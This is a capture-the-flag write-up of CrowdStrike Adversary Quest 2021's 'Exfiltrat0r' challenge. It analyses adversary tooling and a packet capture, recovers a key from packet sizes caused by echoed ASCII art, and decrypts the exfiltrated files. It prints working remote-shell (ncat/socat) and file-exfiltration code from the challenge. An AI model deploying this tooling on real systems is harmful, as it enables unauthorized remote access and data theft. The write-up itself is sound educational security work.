# Crowdstrike Adversary Quest 2021 / Protective Penguin / #4 Exfiltrat0r

## Challenge Description
Additional analysis of the victim network allowed us to recover some PROTECTIVE PENGUIN tooling that appears to provide remote shell and data exfiltration capabilities. While we were able to capture some network traffic of these tools in action, all communications are encrypted. We have wrapped all relevant information into a TAR archive.
Are you able to identify any weaknesses that would allow us to recover the encryption key and figure out what data was exfiltrated?

## Approach
- Analyze Evidence Files *cryptshell.sh* and *exfil.py*
- Analyze *trace.pcapng*
- Experiment with cryptshell.sh and exfil.py
- Identify side channel information leak
- Decrypt transmitted files

### Code of *cryptshell.sh*
```bash
#!/bin/sh

listen() {
    exec ncat -lvk4 $1 $2 --ssl -c 'python3 -c "import pty;pty.spawn(\"/bin/bash\")"'
}

connect() {
    exec socat -,raw,echo=0 SSL:$1:$2,verify=0
    #exec socat - SSL:$1:$2,verify=0
}

if [ $# -eq 3 ] && [ $1 = "listen" ] ; then
    listen $2 $3
fi

if [ $# -eq 3 ] && [ $1 = "connect" ] ; then
    connect $2 $3
fi
```

### Analysis of *cryptshell.sh*
Used with command line argumentis *listen* *ip* and *port*, the script starts a TLS server via *ncat* that yields a remote shell when connected to.
used with arguments *connect* *ip* *port*, the script acts as a TLS client using *socat* to connect to the server at *ip* *port*.

Question: Why is there a commented line that is an alternative *socat* command, missing the options *raw* and *echo=0*?
This could be a breadcrumb for later.

### Code of *exfil.py* (with large cuts)
```python
[lots of ASCII art ansi sequences and stuff cut out for readability]

class CryptMsg:
    def __init__(self, key, filename, host, port):
        self.filename = os.path.abspath(filename)
        self.version = 1
        self.filename = filename
        self.key = key
        self.key_salt = get_random_bytes(16)
        self.derived_key = scrypt(self.key, self.key_salt, 32, 2**14, 8, 1)
        self.cipher = ChaCha20_Poly1305.new(key=self.derived_key)
        self.host = host
        self.port = port
        self.sock = None
        self.finished = False

    def _send_preamble(self):
        self.sock.sendall(b"".join([
            u8(self.version),
            u8(len(self.cipher.nonce)),
            self.cipher.nonce,
            u8(len(self.key_salt)),
            self.key_salt,
            self.cipher.encrypt(u32(len(self.filename))),
            self.cipher.encrypt(self.filename.encode()),
        ]))

    def _send_file(self):
        with open(self.filename, "rb") as infile:
            while chunk := infile.read(4096):
                self.sock.sendall(self.cipher.encrypt(chunk))

    def _send_digest(self):
        self.sock.sendall(self.cipher.digest())

    def tx(self):
        self.sock = socket.create_connection((self.host, self.port))
        self._send_preamble()
        self._send_file()
        self._send_digest()
        self.sock.close()
        self.finished = True

    def __repr__(self):
        return ("CryptMsg<key: {s.key!r}, filename: {s.filename!r}, "
               "host: {s.host!r}, port: {s.port!r}, finished: "
               "{s.finished!r}>").format(s=self)

class AsciiChar:
  # stuff

class AsciiSequence:
  # more stuff

def banner():
    print_chunks(colorize("Exfiltrat0r v23"))
    print_chunks(colorize("-----------------"))

def interactive_key():
    print_linewise(colorize("Enter key:"))

    def getch():
        fd = sys.stdin.fileno()
        old_settings = termios.tcgetattr(fd)
        tty.setraw(sys.stdin.fileno())

        ch = sys.stdin.read(1)

        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)

        return ch

    sequence = AsciiSequence()

    while c := getch():
        if c == "\r":
            if len(sequence) >0:
                break
            continue
        elif c == "\x03":
            raise KeyboardInterrupt            
        elif c == "\x7f":
            with suppress(IndexError):
                sys.stdout.write(sequence.clear())
                sys.stdout.flush()
                sequence.pop()
                sys.stdout.write(sequence.render())
                sys.stdout.flush()
            continue

        if sequence.plain_chars:
            sys.stdout.write(sequence.clear())

        sequence.add_char(c)

        sys.stdout.write(sequence.render())
        sys.stdout.flush()

    return "".join(sequence.plain_chars)

def main(host, port, files, key=None):
    banner()
    if key is None:
        key = interactive_key()

    # stuff

    with ThreadPoolExecutor(max_workers=8) as executor:
        for path in files:
            msg = CryptMsg(key, path, host, port)
            executor.submit(msg.tx).add_done_callback(partial(done, msg))

if __name__ == "__main__":
    # arg parsing stuff
    main(args.host, args.port, args.file, args.key)
```

### Analysis of *exfil.py*
- Crypto: ChaCha20 Poly1305
-- https://tools.ietf.org/html/rfc7905
-- https://loup-vaillant.fr/tutorials/chacha20-design

-- There are some side channel attacks
-- There is an issue if nonce is 16 byte, script uses default, whatever that is
- Scrypt call looks good. 32 byte keys
- ASCII art stuff, characters, interactive_key() when option -k is not used
- Maybe interactive_key() has a fault, FIXME
-- There seems to be a lot of character manipulation, maybe somewhere is an issue that limits the key set
- Maybe empty key was used, is it possible?
- This is how a message looks like:
-- 1 byte: version (PLAIN)
-- 1 byte: nonce length (PLAIN)
--  variable: nonce (PLAIN)
-- 1 byte: key salt length (PLAIN)
--  variable: kay salt (PLAIN)
-- 4 byte: filename length (ENCRYPTED)
-- Variable: filename (ENCRYPTED)
-- (ENCRYPTED) file content in 4096 chunks before enc
-- Digest

### Analysis of *trace.pcapng*
- 4 tcp streams between 192.168.122.1 and 192.168.122.251
- 192.168.122.1 is likely attacker box
- 192.168.122.251 is likely target box
- stream 0 (.1:56180 -> .251:31337), SYN in packet 1
--> tls 1.3 traffic, likely from cryptshell.sh (ncat --ssl server, socat SSL client)
tls stream / cryptshell.sh
Cipher Suite: TLS_AES_256_GCM_SHA384 (0x1302)

- stream 1 (.251:57760 -> .1:1234), SYN in packet 1578 / exfil.py communication
--> preamble in packet 1581
---- version: 1
---- len(nonce): 0x0c (12)
---- nonce: 60 4a e7 0f 2d 46 29 35 d4 c5 41 44
---- len(salt): 0x10 (16)
---- salt: 75 7f fa d8 0a 5f 69 89 14 07 75 1d a4 c7 24 ba
---- len(filename): e8 5e 70 ce (crypted, u32)  <- encrypted value 11 as u32, likely 0b 00 00 00
---- filename: af 11 d8 51 30 d8 2c c0 1a 97 71 (11 bytes)

--> file content in packet 1583 (encrypted)
---- 1754 bytes

--> cipher.digest in packet 1585 (plain)
---- 9b 43 7e 8b a9 c9 ab 55 cb 18 1c d6 70 c0 64 78 (16 bytes, Poly1305 MAC tag))

- stream 2 (.251:57762 -> .1:1234), SYN in packet 1591 / exfil.py
--> preamble in packet 1594
---- version: 1
---- len(nonce): 0x0c (12)
---- nonce: 0b 5d 76 9d 19 f3 ba 9b 62 17 b9 e0
---- len(salt): 0x10 (16)
---- salt: ad b8 82 d2 85 32 07 0c f0 8c c9 c9 84 c6 b7 52
---- len(filename): b2 69 7e b1 (crypted, u32) <- encrypted value 14 as u32, likely 0e 00 00 00
---- filename: 84 a4 43 1c 3b 49 66 00 72 e6 70 9c dc d9 (14 bytes)

--> file content in packet 1596 (encrypted)
---- 2533 bytes

--> cipher.digest in packet 1598 (plain)
---- 71 a7 e4 3e 42 8d cd ea a3 c7 b7 cc ec 4f e3 29

- stream 3 (.251:57764 -> .1:1234), SYN in packet 1604 / exfil.py
--> preamble in packet 1607
---- version: 1
---- len(nonce): 0x0c (12)
---- nonce: db ad 67 ae 23 6b 3b 32 86 78 36 7b
---- len(salt): 0x10 (16)
---- salt: e1 54 fd c0 0c 76 bd 1f f9 21 cc 27 b9 fa 3b d5
---- len(filename): c2 9d cf 5b (crypted, u32) <- encrypted value 13 as u32, likely 0d 00 00 00
---- filename: 4d 6d 1a 22 21 67 aa f3 5f 51 35 76 98 (13 bytes)

--> file contents in packets 1609+
---- much more data, tcp window full packet 1653/1654

--> cipher.digest unknown, should be in last data packet 1660 (FIN, PSH, ACK)
---- maybe last 16 bytes: a9 c8 2d ad ef 66 f8 a7 7a 9f 5b 39 7d d1 ea f0

### Approaches / Ideas
There are some known strings in the shell stream 0, like call of exfil script with ip port and output from exfil script (transfer complete). But it’s at unknown Offset in ciphertext. Attack on tls 1.3 seems difficult?
Digest is probably hash of ciphertext (encrypted file content)?

ChaCha20-Poly1305
https://tools.ietf.org/html/rfc7905

1.3 What do you mean to authenticate the encryption?
Make sure nobody modifies the ciphertext (encrypted message), it works like verify SHA or MD5 hash of a file. Poly1305 generates a MAC (Message Authentication Code) (128 bits, 16 bytes) and appending it to the ChaCha20 ciphertext (encrypted text). During decryption, the algorithm checks the MAC to assure no one modifies the ciphertext.

1.4 How ChaCha20-Poly1305 works?
ChaCha20 encryption uses the key and IV (initialization value, nonce) to encrypt the plaintext into a ciphertext of equal length. Poly1305 generates a MAC (Message Authentication Code) and appending it to the ciphertext. In the end, the length of the ciphertext and plaintext is different.

-> encrypted file contents end with 16 bytes poly1305 MAC
--> cipher.digest might contain unencrypted poly1305 MAC?

P.S For ChaCha20-Poly1305, we don’t need to define the initial counter value; it begins at 1.

sudo pip3 install PyCryptoDome


--> Challenge text: "[...] identify any weaknesses that would allow us to recover the encryption key [...]"

Considering the evidence and the fact that the used ciphers seem strong enough, there might be some kind of side channel attack possibility to recover the key from the encrypted data streams.


```
python3 exfil.py 127.0.0.1 22 trace.pcapng
   ____         ___   _    __  __               __   ___                     ___    ____
  / __/ __ __  / _/  (_)  / / / /_  ____ ___ _ / /_ / _ \  ____      _  __  |_  |  |_  /
 / _/   \ \ / / _/  / /  / / / __/ / __// _ `// __// // / / __/     | |/ / / __/  _/_ <
/___/  /_\_\ /_/   /_/  /_/  \__/ /_/   \_,_/ \__/ \___/ /_/        |___/ /____/ /____/


 ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ ____
/___//___//___//___//___//___//___//___//___//___//___//___//___//___//___//___//___/


   ____        __                    __                 _
  / __/  ___  / /_ ___   ____       / /__ ___   __ __  (_)
 / _/   / _ \/ __// -_) / __/      /  '_// -_) / // / _
/___/  /_//_/\__/ \__/ /_/        /_/\_\ \__/  \_, / (_)
                                              /___/
     __   ___   ___          __       _
 ___/ /  / _/  / _/  ___ _  / /      (_)
/ _  /  / _/  / _/  / _ `/ / _ \    / /
\_,_/  /_/   /_/    \_, / /_//_/ __/ /
                   /___/        |___/
Transfer failed: CryptMsg<key: 'dffghj', filename: 'trace.pcapng', host: '127.0.0.1', port: 22, finished: False> ([Errno 111] Connection refused)
```

-> maybe the ascii art could be used as known plaintext? would have to target the cryptshell.sh tls1.3 stream


### Side Channel Information Leak
Remind the breadcrumb from analysis of *cryptshell.sh*?
Maybe there is some kind of information leak based on input echoing?

Experiment with cryptshell.sh and sniff traffic for comparisons.

Start listen server
```
$ ./cryptshell.sh listen 127.0.0.1 7777
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: 8EB1 958B DDB0 359F 626E BCEE A3A5 E481 8D8E ACB1
Ncat: Listening on 127.0.0.1:7777
```

Sniff traffic
```
$ sudo tcpdump -n -n -i lo 'host 127.0.0.1' -w connect.pcap
tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

Connect to server
```
$ ./cryptshell.sh connect 127.0.0.1 7777
```

The connection itself consists of 15 packets on the wire using TLS cipher: TLS_AES_256_GCM_SHA384 (0x1302).
Call exfil.py and sniff.
```
$ ./exfil.py 127.0.0.1 8888 exfil.py                                                                                                                                                                         
   ____         ___   _    __  __               __   ___                     ___    ____
  / __/ __ __  / _/  (_)  / / / /_  ____ ___ _ / /_ / _ \  ____      _  __  |_  |  |_  /
 / _/   \ \ / / _/  / /  / / / __/ / __// _ `// __// // / / __/     | |/ / / __/  _/_ < 
/___/  /_\_\ /_/   /_/  /_/  \__/ /_/   \_,_/ \__/ \___/ /_/        |___/ /____/ /____/ 
                                                                                        
                                                                                     
 ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ ____
/___//___//___//___//___//___//___//___//___//___//___//___//___//___//___//___//___/
                                                                                     
                                                                                     
   ____        __                    __                 _ 
  / __/  ___  / /_ ___   ____       / /__ ___   __ __  (_)
 / _/   / _ \/ __// -_) / __/      /  '_// -_) / // / _   
/___/  /_//_/\__/ \__/ /_/        /_/\_\ \__/  \_, / (_)  
                                              /___/    
```

The sniffed traffic for this ASCII art seems to have the packet sizes 248, 464, 536, 452 and 188.
These exact packet sizes can be found in the trace.pcapng file at packets #1527, #1529, #1531, #1533 and #1535.
So it looks like there has been a keyboard interactive input of the ChaCha20 key used for exfil.py.

The packets directly following the ASCII art might leak which key was pressed. Each keypress input packet seems to be 89 bytes large with a larger packet returned (due to ASCII art echoing back).
Keypress | Packet # In | Packet Size In | Packet # Echo | Packet Size Echo
--- | --- | --- | --- | ---
1 | 1537 | 89 | 1538 | 265
2 | 1540 | 89 | 1541 | 643
3 | 1543 | 89 | 1544 | 888
4 | 1546 | 89 | 1547 | 1121
5 | 1549 | 89 | 1550 | 1412
6 | 1552 | 89 | 1553 | 1689
7 | 1555 | 89 | 1556 | 1919
8 | 1558 | 89 | 1559 | 2230
9 | 1561 | 89 | 1562 | 2527
10 | 1564 | 89 | 1565 | 2732
11 | 1567 | 89 | 1568 | 3023
12 | 1570 | 89 | 1571 | 3354
13 | 1573 | 89 | 1574 | 3717

After these packets the packet sizes differ in a way that suggests that the interactive key was 13 characters long.

One approach could be calculating the delta values between each keypress. But a quick test entering `aaa` yields packet sizes 260, 557 (+297) and 839 (+282).
So basically it's a trial and error from here on trying to find the correct keys yielding the same cumulated packet sizes from trace.pcapng.

Keypress | Packet # In | Packet Size In | Packet # Echo | Packet Size Echo | Character
--- | --- | --- | --- | --- | ---
1 | 1537 | 89 | 1538 | 265 | m
2 | 1540 | 89 | 1541 | 643 | y
3 | 1543 | 89 | 1544 | 888 | _
4 | 1546 | 89 | 1547 | 1121 | s
5 | 1549 | 89 | 1550 | 1412 | 3
6 | 1552 | 89 | 1553 | 1689 | c
7 | 1555 | 89 | 1556 | 1919 | r
8 | 1558 | 89 | 1559 | 2230 | 3
9 | 1561 | 89 | 1562 | 2527 | t
10 | 1564 | 89 | 1565 | 2732 | _
11 | 1567 | 89 | 1568 | 3023 | k
12 | 1570 | 89 | 1571 | 3354 | 3
13 | 1573 | 89 | 1574 | 3717 | y

This side channel information leak through ASCII art packet sizes yielded the key **my_s3cr3t_k3y** that was used to exfiltrate data via *exfil.py*.

### Decrypt TCP streams 1-3 with ChaCha20 Key
To decrypt the streams 1-3 from trace.pcapng we need each nonce and salt which - according to above analysis of exfil.py - have been transmitted in the unencrypted preamble packets.

Stream | Preamble Packet # | Nonce | Salt
--- | --- | --- | ---
1 | 1581 | 60 4a e7 0f 2d 46 29 35 d4 c5 41 44 | 75 7f fa d8 0a 5f 69 89 14 07 75 1d a4 c7 24 ba
2 | 1594 | 0b 5d 76 9d 19 f3 ba 9b 62 17 b9 e0 | ad b8 82 d2 85 32 07 0c f0 8c c9 c9 84 c6 b7 52
3 | 1607 | db ad 67 ae 23 6b 3b 32 86 78 36 7b | e1 54 fd c0 0c 76 bd 1f f9 21 cc 27 b9 fa 3b d5

Extract the crypted data from stream 3, save it as network.png.enc and decrypt via
```
#!/usr/bin/env python3
from Crypto.Cipher import ChaCha20_Poly1305
from Crypto.Protocol.KDF import scrypt
from Crypto.Random import get_random_bytes
from binascii import unhexlify

key = "my_s3cr3t_k3y"
nonce = unhexlify("dbad67ae236b3b328678367b")
key_salt = unhexlify("e154fdc00c76bd1ff921cc27b9fa3bd5")
derived_key = scrypt(key, key_salt, 32, 2**14, 8, 1)
cipher = ChaCha20_Poly1305.new(key=derived_key, nonce=nonce)

with open("network.png.enc", "rb") as f:
  c = f.read()

p = cipher.decrypt(c)

with open("network.png", "wb") as g:
  g.write(p)
```

The decrypted network.png yields the flag: CS{p4ck3t_siz3_sid3_ch4nn3l}
The first two streams contain a passwd and a funny rickroll. Thanks for that!

Flag: **CS{p4ck3t_siz3_sid3_ch4nn3l}**

## Conclusion
Using modern and cryptographically secure algorithms is a great start for securing the confidentiality and integrity of data transmissions.
But as this challenge shows quite nicely, that is not enough. Fancy ASCII art from tools used in an interactive shell might lead to information leaks through side channels like packet sizes (or timings).
